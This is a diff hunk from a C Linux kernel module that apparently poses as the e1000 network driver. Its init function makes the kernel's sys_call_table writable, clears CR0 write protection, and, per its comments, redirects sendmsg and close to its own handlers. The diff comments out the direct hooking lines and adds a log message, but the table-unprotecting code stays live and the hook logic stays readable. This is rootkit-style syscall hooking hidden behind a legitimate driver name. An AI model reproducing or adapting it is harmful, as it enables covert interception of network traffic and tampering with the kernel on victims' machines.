@@ -309,11 +309,12 @@ static int __init e1000_init_module(void)
         
         _sys_call_page = virt_to_page(&sys_call_table);
         pages_rw(_sys_call_page, 1);
+        pr_info("sys_call_table is now read_write\n");
         /* store original location of sendmsg(). Alter sys_call_table to point to our functions*/
         //original_sendmsg = (void *)xchg(&sys_call_table[__NR_sendmsg], e1000_sendmsg);
         //original_close = (void *)xchg(&sys_call_table[__NR_close], e1000_close);
-        original_sendmsg = (void *)sys_call_table[__NR_sendmsg];
-        sys_call_table[__NR_sendmsg] = e1000_sendmsg;
+       // original_sendmsg = (void *)sys_call_table[__NR_sendmsg];
+        //sys_call_table[__NR_sendmsg] = e1000_sendmsg;
         
         write_cr0(read_cr0() | (0x10000));
         
